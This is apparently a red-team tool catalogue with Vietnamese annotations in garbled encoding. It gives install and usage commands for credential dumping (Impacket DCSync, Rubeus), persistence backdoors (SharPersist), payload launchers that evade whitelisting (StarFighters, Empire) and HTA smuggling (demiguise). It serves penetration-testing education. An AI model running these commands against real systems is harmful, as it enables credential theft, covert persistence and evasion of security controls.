**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ vá» cÃ¡ch sá»­ dá»¥ng **Macro_pack**. NÃ³ cÃ³ thá»ƒ nháº­n mÃ£ nguá»“n VBA tá»« `msfvenom` thÃ´ng qua piping vÃ  che giáº¥u nÃ³ (`-o`) vÃ  xuáº¥t ra file VBA (`-G`). NÃ³ cÅ©ng cÃ³ thá»ƒ nhÃºng dropper (`-t DROPPER`) hoáº·c sá»­ dá»¥ng cÃ¡c ká»¹ thuáº­t khÃ¡c nhÆ° **DDE** (`--dde`) Ä‘á»ƒ thá»±c thi lá»‡nh.

![image](https://user-images.githubusercontent.com/100603074/209868800-7fbcfdec-8ae8-4693-8438-feebc2309667.png)

### [ğŸ”™](#tool-list)[**PowerSploit**](https://github.com/PowerShellMafia/PowerSploit)

A collection of **PowerShell scripts** and modules that can be used to achieve a variety of **red teaming objectives**.

Some of the features of **PowerSploit**:

- Dump password hashes and extract clear-text passwords from memory
- Escalate privileges and bypass security controls
- Execute arbitrary **PowerShell** code and bypass execution restrictions
- Perform network reconnaissance and discovery
- Generate **payloads** and execute **exploits**

**Install:** *1. Save to PowerShell modules folder*

First you will need to download the [ThÆ° má»¥c PowerSploit](https://github.com/PowerShellMafia/PowerSploit) and save it to your **PowerShell** modules folder.

Your **PowerShell** modules folder path can be found with the following command:

```
$Env:PSModulePath
```
**LÆ°u Ã½:** Biáº¿n mÃ´i trÆ°á»ng `$Env:PSModulePath` trong **PowerShell** chá»©a danh sÃ¡ch cÃ¡c Ä‘Æ°á»ng dáº«n mÃ  **PowerShell** tÃ¬m kiáº¿m module. Báº¡n cáº§n Ä‘áº·t thÆ° má»¥c **PowerSploit** Ä‘Ã£ táº£i vá» vÃ o má»™t trong cÃ¡c Ä‘Æ°á»ng dáº«n nÃ y Ä‘á»ƒ **PowerShell** cÃ³ thá»ƒ tÃ¬m tháº¥y module.

**Install:** *2. Install PowerSploit as a PowerShell module*

You will then need to install the **PowerSploit** module (use the name of the downloaded folder).

**Note:** *Your PowerShell execution policy might block you, to fix this run the following command.*

```
powershell.exe -ep bypass
```
**LÆ°u Ã½:** Cháº¡y **PowerShell** vá»›i tÃ¹y chá»n `-ep bypass` Ä‘á»ƒ bá» qua chÃ­nh sÃ¡ch thá»±c thi, cho phÃ©p báº¡n cháº¡y cÃ¡c script cá»¥c bá»™, ngay cáº£ khi chÃºng khÃ´ng Ä‘Æ°á»£c kÃ½. Cáº©n trá»ng khi sá»­ dá»¥ng tÃ¹y chá»n nÃ y.

Now you can install the **PowerSploit** module.

```
Import-Module PowerSploit
```
**LÆ°u Ã½:** Lá»‡nh **PowerShell** Ä‘á»ƒ táº£i vÃ  lÃ m cho cÃ¡c lá»‡nh vÃ  hÃ m cá»§a module **PowerSploit** cÃ³ sáºµn trong phiÃªn hiá»‡n táº¡i.

**CÃ¡ch sá»­ dá»¥ng:**

```
Get-Command -Module PowerSploit
```
**LÆ°u Ã½:** Lá»‡nh **PowerShell** Ä‘á»ƒ liá»‡t kÃª táº¥t cáº£ cÃ¡c lá»‡nh (cmdlet, function, alias) Ä‘Æ°á»£c cung cáº¥p bá»Ÿi module **PowerSploit** sau khi nÃ³ Ä‘Æ°á»£c import thÃ nh cÃ´ng. Äiá»u nÃ y giÃºp báº¡n khÃ¡m phÃ¡ cÃ¡c tÃ­nh nÄƒng cá»§a module.

![image](https://user-images.githubusercontent.com/100603074/210267625-3135de58-df26-4e0a-9de4-741ad37d2eb9.png)

### [ğŸ”™](#tool-list)[**Rubeus**](https://github.com/GhostPack/Rubeus)

A tool that can be used to perform various actions related to Microsoft **Active Directory (AD)** environments, such as dumping password hashes, creating/deleting users, and modifying user properties.

Some of the features of **Rubeus**:

- **Kerberoasting**
- **Golden ticket** attacks
- **Silver ticket** attacks

**Install (Táº£i xuá»‘ng):**

You can install the unofficial pre-compiled **Rubeus** binary [táº¡i Ä‘Ã¢y](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe).
**LÆ°u Ã½:** Táº£i xuá»‘ng file `.exe` Ä‘Ã£ Ä‘Æ°á»£c biÃªn dá»‹ch sáºµn. ÄÃ¢y lÃ  cÃ¡ch dá»… nháº¥t nhÆ°ng báº¡n cáº§n tin tÆ°á»Ÿng nguá»“n cung cáº¥p file.

**Install (BiÃªn dá»‹ch):**

**Rubeus** is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Open the rubeus [project .sln](https://github.com/GhostPack/Rubeus), choose "**Release**", and **build**.
**LÆ°u Ã½:** CÃ¡ch nÃ y yÃªu cáº§u mÃ´i trÆ°á»ng phÃ¡t triá»ƒn **Visual Studio** Ä‘á»ƒ biÃªn dá»‹ch mÃ£ nguá»“n C# cá»§a **Rubeus** thÃ nh file thá»±c thi.

**CÃ¡ch sá»­ dá»¥ng:**

```
Rubeus.exe -h
```
**LÆ°u Ã½:** Lá»‡nh nÃ y hiá»ƒn thá»‹ mÃ n hÃ¬nh trá»£ giÃºp cá»§a **cÃ´ng cá»¥ Rubeus**, liá»‡t kÃª táº¥t cáº£ cÃ¡c lá»‡nh vÃ  tÃ¹y chá»n khÃ¡c nhau mÃ  nÃ³ há»— trá»£ (vÃ­ dá»¥: `kerberoast`, `tge`, `renew`, `ptt`, `monitor`, ...).

![image](https://user-images.githubusercontent.com/100603074/208250015-674a6fee-95b7-4edf-bd59-fe459cd235ed.png)

### [ğŸ”™](#tool-list)[**SharpUp**](https://github.com/GhostPack/SharpUp)

A nice tool for checking a victims endpoint for vulnerabilites relating to high integrity processes, groups, hijackable paths, etc.

It is designed to be run on a compromised victim machine to gather information about the current security configuration, including information about installed software, services, group policies, and other security-related settings.

**Install (Táº£i xuá»‘ng):**

You can install the unofficial pre-compiled **SharpUp** binary [táº¡i Ä‘Ã¢y](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe).
**LÆ°u Ã½:** Táº£i xuá»‘ng file `.exe` Ä‘Ã£ Ä‘Æ°á»£c biÃªn dá»‹ch sáºµn.

**Install (BiÃªn dá»‹ch):**

**SharpUp** is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Open the **SharpUp** [project .sln](https://github.com/GhostPack/SharpUp), choose "**Release**", and **build**.
**LÆ°u Ã½:** BiÃªn dá»‹ch tá»« mÃ£ nguá»“n C# báº±ng **Visual Studio**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
SharpUp.exe audit
#-> Cháº¡y táº¥t cáº£ cÃ¡c kiá»ƒm tra lá»— há»•ng báº¥t ká»ƒ cáº¥p Ä‘á»™ toÃ n váº¹n hay tÆ° cÃ¡ch nhÃ³m.

SharpUp.exe HijackablePaths
#-> Chá»‰ kiá»ƒm tra xem cÃ³ cÃ¡c Ä‘Æ°á»ng dáº«n cÃ³ thá»ƒ sá»­a Ä‘á»•i trong biáº¿n %PATH% cá»§a ngÆ°á»i dÃ¹ng hay khÃ´ng.

SharpUp.exe audit HijackablePaths
#-> Chá»‰ kiá»ƒm tra cÃ¡c Ä‘Æ°á»ng dáº«n cÃ³ thá»ƒ sá»­a Ä‘á»•i trong %PATH% cá»§a ngÆ°á»i dÃ¹ng báº¥t ká»ƒ cáº¥p Ä‘á»™ toÃ n váº¹n hay tÆ° cÃ¡ch nhÃ³m.
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ vá» cÃ¡ch sá»­ dá»¥ng **SharpUp.exe** vá»›i cÃ¡c Ä‘á»‘i sá»‘ khÃ¡c nhau Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c kiá»ƒm tra nÃ¢ng quyá»n cá»¥c bá»™ trÃªn mÃ¡y **Windows** mÃ  nÃ³ Ä‘ang cháº¡y. NÃ³ giÃºp xÃ¡c Ä‘á»‹nh cÃ¡c cÆ¡ há»™i nÃ¢ng quyá»n.

ToÃ n bá»™ nhÃ³m lá»‡nh vÃ  tham sá»‘ cÃ³ thá»ƒ Ä‘Æ°á»£c tÃ¬m tháº¥y [táº¡i Ä‘Ã¢y](https://github.com/GhostPack/SharpUp#command-groups).

![image](https://user-images.githubusercontent.com/100603074/210079939-e709cced-04a2-44a5-9da0-f387bc6599b1.png)

### [ğŸ”™](#tool-list)[**SQLRecon**](https://github.com/skahwah/SQLRecon)

**MS-SQL** (Microsoft SQL Server) lÃ  má»™t há»‡ quáº£n trá»‹ cÆ¡ sá»Ÿ dá»¯ liá»‡u quan há»‡ Ä‘Æ°á»£c phÃ¡t triá»ƒn vÃ  tiáº¿p thá»‹ bá»Ÿi Microsoft.

This C# **MS-SQL toolkit** is designed for offensive reconnaissance and **post-exploitation**. For detailed usage information on each technique, refer to the [wiki](https://github.com/skahwah/SQLRecon/wiki).

**Install (Binary):**

You can download the latest binary release from [táº¡i Ä‘Ã¢y](https://github.com/skahwah/SQLRecon/releases).
**LÆ°u Ã½:** Táº£i xuá»‘ng file `.exe` Ä‘Ã£ Ä‘Æ°á»£c biÃªn dá»‹ch sáºµn.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Authenticating using Windows credentials
SQLRecon.exe -a Windows -s SQL01 -d master -m whoami

# Authenticating using Local credentials
SQLRecon.exe -a Local -s SQL02 -d master -u sa -p Password123 -m whoami

# Authenticating using Azure AD credentials
SQLRecon.exe -a azure -s azure.domain.com -d master -r domain.com -u skawa -p Password123 -m whoami

# Run whoami
SQLRecon.exe -a Windows -s SQL01 -d master -m whoami

# View databases
SQLRecon.exe -a Windows -s SQL01 -d master -m databases

# View tables
SQLRecon.exe -a Windows -s SQL01 -d master -m tables -o AdventureWorksLT2019
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **cÃ´ng cá»¥ SQLRecon.exe** vá»›i cÃ¡c tham sá»‘ dÃ²ng lá»‡nh. `-a` chá»‰ Ä‘á»‹nh phÆ°Æ¡ng thá»©c xÃ¡c thá»±c, `-s` tÃªn server SQL, `-d` database, `-u` ngÆ°á»i dÃ¹ng, `-p` máº­t kháº©u, `-r` realm, `-m` module (hÃ nh Ä‘á»™ng muá»‘n thá»±c hiá»‡n nhÆ° `whoami`, `databases`, `tables`, ...), `-o` Ä‘á»‘i tÆ°á»£ng cá»¥ thá»ƒ cho module. CÃ´ng cá»¥ nÃ y cháº¡y trÃªn **Windows** vÃ  tÆ°Æ¡ng tÃ¡c vá»›i **server MS-SQL**.

Full usage information can be found on the [wiki](https://github.com/skahwah/SQLRecon/wiki).

Tool module usage information can be found [táº¡i Ä‘Ã¢y](https://github.com/skahwah/SQLRecon#usage).

![image](https://user-images.githubusercontent.com/100603074/211530318-6e115272-a00c-4e9e-af9a-852d476ff3fb.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« trang trá»£ giÃºp SQLRecon*

### [ğŸ”™](#tool-list)[**UltimateAppLockerByPassList**](https://github.com/api0cradle/UltimateAppLockerByPassList)

This resrouce is a collection of the most common and known techniques to bypass **AppLocker**.

Since **AppLocker** can be configured in different ways [@api0cradle](https://github.com/api0cradle) maintains a verified list of bypasses (that works against the default **AppLocker** rules) and a list with possible bypass technique (depending on configuration) or claimed to be a bypass by someone.

They also have a list of generic bypass techniques as well as a legacy list of methods to execute through DLLs.

Indexed Lists

- [Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
- [VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
- [UnverifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/UnverifiedAppLockerBypasses.md)
- [DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)
**LÆ°u Ã½:** CÃ¡c liÃªn káº¿t nÃ y trá» Ä‘áº¿n cÃ¡c tá»‡p **Markdown** trong kho lÆ°u trá»¯, liá»‡t kÃª cÃ¡c ká»¹ thuáº­t bypass **AppLocker** khÃ¡c nhau. TÃ i nguyÃªn nÃ y chá»§ yáº¿u lÃ  tÃ i liá»‡u.

![image](https://user-images.githubusercontent.com/100603074/217654010-5fa1102b-7463-4389-bd73-48a6b8a752bc.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/api0cradle/UltimateAppLockerByPassList*

### [ğŸ”™](#tool-list)[**StarFighters**](https://github.com/Cn33liz/StarFighters)

A **JavaScript** and **VBScript Based Empire Launcher**, which runs within their own embedded **PowerShell Host**.

Both Launchers run within their own embedded **PowerShell Host**, so we don't need **PowerShell.exe**.

This might be usefull when a company is blocking **PowerShell.exe** and/or is using a **Application Whitelisting** solution, but does not block running JS/VBS files.

**CÃ¡ch sá»­ dá»¥ng:**

- Setup a new Listener within **PowerShell Empire**
- Use the `Launcher` command to Generate a **PowerShell launcher** for this listener
- Copy and Replace the Base64 encoded Launcher Payload within the **StarFighter JavaScript** or **VBScript file**

For the **JavaScript** version use the following Variable:

```javascript
  var EncodedPayload = "<Paste Encoded Launcher Payload Here>"
```

For the **VBScript** version use the following Variable:

```vbscript
  Dim EncodedPayload: EncodedPayload = "<Paste Encoded Launcher Payload Here>"
```

- Then run: `wscript.exe StarFighter.js` or `StarFighter.vbs` on Target, or DoubleClick the launchers within Explorer.
**LÆ°u Ã½:** ÄÃ¢y lÃ  hÆ°á»›ng dáº«n sá»­ dá»¥ng cÃ¡c tá»‡p **script StarFighters** sau khi Ä‘Ã£ cÃ³ **payload** tá»« **Empire C2 framework**. Báº¡n copy **payload** **Base64** Ä‘Ã£ táº¡o vÃ  dÃ¡n vÃ o biáº¿n `EncodedPayload` trong tá»‡p `.js` hoáº·c `.vbs` cá»§a **StarFighters**. Sau Ä‘Ã³ thá»±c thi tá»‡p `.js` hoáº·c `.vbs` trÃªn mÃ¡y má»¥c tiÃªu báº±ng `wscript.exe` hoáº·c nháº¥p Ä‘Ãºp. Do **WSH** cÃ³ thá»ƒ thá»±c thi **JavaScript** vÃ  **VBScript** mÃ  khÃ´ng cáº§n gá»i trá»±c tiáº¿p **PowerShell.exe**, ká»¹ thuáº­t nÃ y giÃºp nÃ© trÃ¡nh cÃ¡c giáº£i phÃ¡p cháº·n **PowerShell.exe**.

![image](https://user-images.githubusercontent.com/100603074/217654090-d8f57773-4fa0-44dd-b5b1-ad4b66f7c98e.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://www.hackplayers.com/2017/06/startfighters-un-launcher-de-empire-en-js-vbs.html*

### [ğŸ”™](#tool-list)[**demiguise**](https://github.com/nccgroup/demiguise)

The aim of this project is to generate **.html** files that contain an encrypted **HTA** file.

The idea is that when your target visits the page, the key is fetched and the **HTA** is decrypted dynamically within the browser and pushed directly to the user.

This is an evasion technique to get round content / file-type inspection implemented by some security-appliances.

Further technical information [táº¡i Ä‘Ã¢y](https://github.com/nccgroup/demiguise#how-does-it-do-it).

**Install:**

```
git clone https://github.com/nccgroup/demiguise
cd demiguise
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tá»« mÃ£ nguá»“n báº±ng **Git**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Generate an encrypted .hta file that executes notepad.exe
python demiguise.py -k hello -c "notepad.exe" -p Outlook.Application -o test.hta
```
**LÆ°u Ã½:** Cháº¡y **script Python demiguise.py** Ä‘á»ƒ táº¡o má»™t tá»‡p `.hta` Ä‘Æ°á»£c mÃ£ hÃ³a. `-k` lÃ  khÃ³a mÃ£ hÃ³a, `-c` lÃ  lá»‡nh sáº½ Ä‘Æ°á»£c thá»±c thi bá»Ÿi HTA Ä‘Ã£ giáº£i mÃ£, `-p` lÃ  quy trÃ¬nh má»¥c tiÃªu cÃ³ kháº£ nÄƒng thá»±c thi Ä‘á»‘i tÆ°á»£ng COM (vÃ­ dá»¥: **Outlook.Application**), `-o` lÃ  tÃªn file output. CÃ´ng cá»¥ nÃ y táº¡o ra file **HTML** chá»©a HTA Ä‘Ã£ mÃ£ hÃ³a vÃ  logic giáº£i mÃ£. Khi náº¡n nhÃ¢n má»Ÿ file HTML nÃ y (thÆ°á»ng gá»­i qua email), mÃ£ JavaScript sáº½ cháº¡y, giáº£i mÃ£ HTA vÃ  thá»±c thi nÃ³ báº±ng `mshta.exe`.

![image](https://user-images.githubusercontent.com/100603074/217654229-fb3a4875-2de2-4bc3-9583-8300e014fda4.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/nccgroup/demiguise*

## [ğŸ”™](#tool-list)[**PowerZure**](https://github.com/hausec/PowerZure)

**PowerZure** is a **PowerShell** project created to assess and exploit resources within **Microsoftâ€™s cloud platform, Azure**. **PowerZure** was created out of the need for a framework that can both perform reconnaissance and exploitation of **Azure, AzureAD**, and the associated resources.

There is zero reason to ever run **PowerZure** on a victimâ€™s machine. Authentication is done by using an existing accesstoken.json file or by logging in via prompt when logging into Azure, meaning you can safely use **PowerZure** to interact with a victimâ€™s cloud instance from your operating machine.

**Install:**

```bash
Install-Module -Name Az
git clone https://github.com/hausec/PowerZure
cd PowerZure
ipmo C:\path\to\PowerZure.psd1
```
**LÆ°u Ã½:**
`Install-Module -Name Az`: CÃ i Ä‘áº·t module Azure chÃ­nh thá»©c cá»§a Microsoft cho **PowerShell**. Cáº§n cÃ³ Ä‘á»ƒ **PowerZure** hoáº¡t Ä‘á»™ng. YÃªu cáº§u káº¿t ná»‘i internet.
`git clone ...`: Táº£i mÃ£ nguá»“n **PowerZure** tá»« GitHub.
`ipmo ...`: (hoáº·c `Import-Module`) Import module **PowerZure** tá»« Ä‘Æ°á»ng dáº«n cá»¥c bá»™. `ipmo` lÃ  bÃ­ danh cho `Import-Module`.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Get a list of AzureAD and Azure objects you have access to
Get-AzureTarget
```
**LÆ°u Ã½:** Lá»‡nh nÃ y lÃ  má»™t trong cÃ¡c cmdlet (**command-let**) cá»§a **PowerZure**. NÃ³ sáº½ liá»‡t kÃª cÃ¡c Ä‘á»‘i tÆ°á»£ng vÃ  tÃ i nguyÃªn trong **Azure** vÃ  **Azure AD** mÃ  ngÆ°á»i dÃ¹ng hiá»‡n táº¡i cÃ³ quyá»n truy cáº­p, dá»±a trÃªn ngá»¯ cáº£nh xÃ¡c thá»±c Ä‘Ã£ Ä‘Æ°á»£c thiáº¿t láº­p. Há»¯u Ã­ch cho giai Ä‘oáº¡n **discovery** vÃ  **reconnaissance** trong mÃ´i trÆ°á»ng **cloud Azure**.

[Blog - Attacking Azure, Azure AD, and Introducing PowerZure](https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a)

![image](https://user-images.githubusercontent.com/100603074/229649681-a1d83b3c-b595-417b-8d77-c3ba90da203f.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://hakin9.org*

**Persistence**
====================

### [ğŸ”™](#tool-list)[**Impacket**](https://github.com/fortra/impacket)

**Impacket** provides a set of low-level **Python binding**s for various network protocols, including **SMB, Kerberos**, and **LDAP**, as well as higher-level libraries for interacting with network services and performing specific tasks such as dumping password hashes and creating network shares.

It also includes a number of command-line tools that can be used to perform various tasks such as dumping **SAM databases**, enumerating **domain trust**s, and cracking Windows passwords.

**Install:**

```bash
python3 -m pip install impacket
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t thÆ° viá»‡n **Python Impacket** cÃ¹ng vá»›i cÃ¡c tiá»‡n Ã­ch command-line liÃªn quan.

**Install (With Example Scripts):**

Download and extract [the package](https://github.com/fortra/impacket), then navigate to the install folder and run...

```bash
python3 -m pip install .
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **Impacket** trá»±c tiáº¿p tá»« mÃ£ nguá»“n Ä‘á»ƒ Ä‘áº£m báº£o cÃ³ cáº£ thÆ° má»¥c `examples` chá»©a cÃ¡c **script** há»¯u Ã­ch khÃ¡c nhÆ° **secretsdump.py**, **smbclient.py**, **psexec.py**, ...

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# TrÃ­ch xuáº¥t hash NTLM vá»›i cÃ¡c file cá»¥c bá»™
secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# DCSync attack vÃ  dump cÃ¡c hash NTLM cá»§a táº¥t cáº£ ngÆ°á»i dÃ¹ng domain.
secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
```
**LÆ°u Ã½:** (ÄÃ£ giáº£i thÃ­ch trong pháº§n Execution). **Impacket** lÃ  má»™t thÆ° viá»‡n ráº¥t máº¡nh cho cÃ¡c tÃ¡c vá»¥ táº¥n cÃ´ng **Active Directory** vÃ  **Windows** dá»±a trÃªn protocol.

```bash
# Gets a list of the sessions opened at the remote hosts
netview.py domain/user:password -target 192.168.10.2

# Retrieves the MSSQL instances names from the target host.
mssqlinstance.py 192.168.1.2

# This script will gather data about the domain's users and their corresponding email addresses.
GetADUsers.py domain/user:password@IP
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ khÃ¡c vá» cÃ¡c script tiá»‡n Ã­ch cá»§a **Impacket**:
`netview.py`: Liá»‡t kÃª cÃ¡c phiÃªn **SMB** má»Ÿ trÃªn mÃ¡y tÃ­nh tá»« xa.
`mssqlinstance.py`: PhÃ¡t hiá»‡n cÃ¡c instance **MS-SQL** trÃªn máº¡ng.
`GetADUsers.py`: Thu tháº­p thÃ´ng tin ngÆ°á»i dÃ¹ng AD bao gá»“m Ä‘á»‹a chá»‰ email.
Nhá»¯ng script nÃ y cáº§n thÃ´ng tin xÃ¡c thá»±c há»£p lá»‡ trÃªn **domain** má»¥c tiÃªu Ä‘á»ƒ hoáº¡t Ä‘á»™ng.

Great [cheat sheet](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/) for **Impacket** usage.

![image](https://user-images.githubusercontent.com/100603074/210079475-a13f7fe2-7801-40dd-977b-e179d0658b47.png)

### [ğŸ”™](#tool-list)[**Empire**](https://github.com/EmpireProject/Empire)

**Empire** is a **post-exploitation framework** that allows you to generate **payloads** for establishing remote connections with victim systems.

Once a **payload** has been executed on a victim system, it establishes a connection back to the **Empire server**, which can then be used to issue commands and control the target system.

**Empire** also includes a number of built-in modules and scripts that can be used to perform specific tasks, such as dumping password hashes, accessing the **Windows registry**, and exfiltrating data.

**Install:**

```bash
git clone https://github.com/EmpireProject/Empire
cd Empire
sudo ./setup/install.sh
```
**LÆ°u Ã½:** Clone mÃ£ nguá»“n vÃ  cháº¡y **script cÃ i Ä‘áº·t** cá»§a **Empire**. YÃªu cáº§u quyá»n **super user** (`sudo`). Script nÃ y sáº½ cÃ i Ä‘áº·t cÃ¡c dependency cáº§n thiáº¿t (PowerShell Empire, Python, Ruby,...) Ä‘á»ƒ cháº¡y server **Empire**. Cháº¡y trÃªn **Linux**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Báº¯t Ä‘áº§u Empire
./empire

# Liá»‡t kÃª cÃ¡c agent Ä‘ang hoáº¡t Ä‘á»™ng
list agents

# Liá»‡t kÃª cÃ¡c listeners Ä‘ang hoáº¡t Ä‘á»™ng
list listeners
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh Ä‘Æ°á»£c sá»­ dá»¥ng bÃªn trong **console Empire** sau khi framework Ä‘Ã£ khá»Ÿi Ä‘á»™ng.

Nice usage [cheat sheet](https://github.com/HarmJ0y/CheatSheets/blob/master/Empire.pdf) by [HarmJoy](https://github.com/HarmJ0y).

![image](https://user-images.githubusercontent.com/100603074/210080911-b3c7572a-a0dd-4664-a3e1-46b343db8a79.png)

### [ğŸ”™](#tool-list)[**SharPersist**](https://github.com/mandiant/SharPersist)

A **Windows persistence toolkit** written in **C#**.

The project has a [wiki](https://github.com/mandiant/SharPersist/wiki).

**Install (Binary):**

You can find the most recent release [táº¡i Ä‘Ã¢y](https://github.com/mandiant/SharPersist/releases).
**LÆ°u Ã½:** Táº£i xuá»‘ng file `.exe` Ä‘Ã£ Ä‘Æ°á»£c biÃªn dá»‹ch sáºµn.

**Install (BiÃªn dá»‹ch):**

- Download the project files from the [GitHub Repo](https://github.com/mandiant/SharPersist).
- Load the Visual Studio project up and go to "**Tools**" --> "**NuGet Package Manager**" --> "**Package Manager Settings**"
- Go to "**NuGet Package Manager**" --> "**Package Sources**"
- Add a package source with the URL "https://api.nuget.org/v3/index.json"
- Install the **Costura.Fody NuGet package**. The older version of **Costura.Fody** (3.3.3) is needed, so that you do not need Visual Studio 2019.
	- `Install-Package Costura.Fody -Version 3.3.3`
- Install the **TaskScheduler package**
	- `Install-Package TaskScheduler -Version 2.8.11`
- You can now build the project yourself!
**LÆ°u Ã½:** HÆ°á»›ng dáº«n chi tiáº¿t Ä‘á»ƒ biÃªn dá»‹ch **SharPersist** tá»« mÃ£ nguá»“n **C#** báº±ng **Visual Studio**, bao gá»“m cÃ i Ä‘áº·t cÃ¡c gÃ³i **NuGet** phá»¥ thuá»™c Ä‘á»ƒ nhÃºng cÃ¡c DLL phá»¥ trá»£ vÃ o tá»‡p thá»±c thi chÃ­nh.

**CÃ¡ch sá»­ dá»¥ng:**

A full list of usage examples can be found [táº¡i Ä‘Ã¢y](https://github.com/mandiant/SharPersist#adding-persistence-triggers-add).

```
#KeePass
SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m add

#Registry
SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add

#Scheduled Task Backdoor
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add

#Startup Folder
SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **cÃ´ng cá»¥ SharPersist.exe** vá»›i cÃ¡c tÃ¹y chá»n. `-t` chá»‰ Ä‘á»‹nh ká»¹ thuáº­t duy trÃ¬ truy cáº­p (registry, task theo lá»‹ch, startup folder, ...). `-c` lÃ  lá»‡nh cáº§n thá»±c thi Ä‘á»ƒ duy trÃ¬ truy cáº­p. `-m add` thÃªm má»¥c duy trÃ¬ truy cáº­p. Má»—i ká»¹ thuáº­t cÃ³ thÃªm cÃ¡c tham sá»‘ cá»¥ thá»ƒ (`-k`, `-v` cho registry; `-n` cho task theo lá»‹ch; `-f` cho startup folder hoáº·c config file **KeePass**). CÃ´ng cá»¥ cháº¡y trÃªn **Windows**.

![image](https://user-images.githubusercontent.com/100603074/208880117-3ce7eefc-9e0b-477d-ada4-b3867909ff38.png)

### [ğŸ”™](#tool-list)[**ligolo-ng**](https://github.com/nicocha30/ligolo-ng)

**Ligolo-ng** is a simple, lightweight and fast tool that allows pentesters to establish **tunnel**s from a **reverse TCP/TLS connection** using a **tun interface** (without the need of **SOCKS**).

Instead of using a **SOCKS proxy** or **TCP/UDP forwarder**s, **Ligolo-ng** creates a userland network stack using [**Gvisor**](https://gvisor.dev/).

When running the **relay/proxy server**, a **tun interface** is used, packets sent to this interface are translated, and then transmitted to the agent remote network.

**CÃ i Ä‘áº·t (Táº£i xuá»‘ng):**

Precompiled binaries (**Windows/Linux/macOS**) are available on the [Release page](https://github.com/nicocha30/ligolo-ng/releases).
**LÆ°u Ã½:** PhÆ°Æ¡ng phÃ¡p Ä‘Æ¡n giáº£n nháº¥t lÃ  táº£i xuá»‘ng file binary Ä‘Ã£ biÃªn dá»‹ch sáºµn.

**CÃ i Ä‘áº·t (Build):**

*Building **ligolo-ng** (**Go >= 1.17** is required):*

```bash
go build -o agent cmd/agent/main.go
go build -o proxy cmd/proxy/main.go

# Build cho Windows
GOOS=windows go build -o agent.exe cmd/agent/main.go
GOOS=windows go build -o proxy.exe cmd/proxy/main.go
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh nÃ y biÃªn dá»‹ch mÃ£ nguá»“n **Golang** Ä‘á»ƒ táº¡o ra file binary cho `agent` (cháº¡y trÃªn mÃ¡y náº¡n nhÃ¢n) vÃ  `proxy` (cháº¡y trÃªn mÃ¡y attacker). Báº¡n cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh há»‡ Ä‘iá»u hÃ nh má»¥c tiÃªu (`GOOS=windows`). YÃªu cáº§u mÃ´i trÆ°á»ng phÃ¡t triá»ƒn **Go**.

**Thiáº¿t láº­p (Linux):**

```bash
sudo ip tuntap add user [tÃªn_ngÆ°á»i_dÃ¹ng_cá»§a_báº¡n] mode tun ligolo
sudo ip link set ligolo up
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh nÃ y thiáº¿t láº­p giao diá»‡n TUN trÃªn há»‡ thá»‘ng **Linux** báº±ng tiá»‡n Ã­ch `ip`. YÃªu cáº§u quyá»n **super user** (`sudo`). Giao diá»‡n TUN nÃ y sáº½ Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi `proxy` server Ä‘á»ƒ chuyá»ƒn tiáº¿p lÆ°u lÆ°á»£ng máº¡ng vÃ o **tunnel**.

**Thiáº¿t láº­p (**Windows**):**

You need to download the [Wintun](https://www.wintun.net/) driver (used by [WireGuard](https://www.wireguard.com/)) and place the `wintun.dll` in the same folder as **Ligolo** (make sure you use the right architecture).
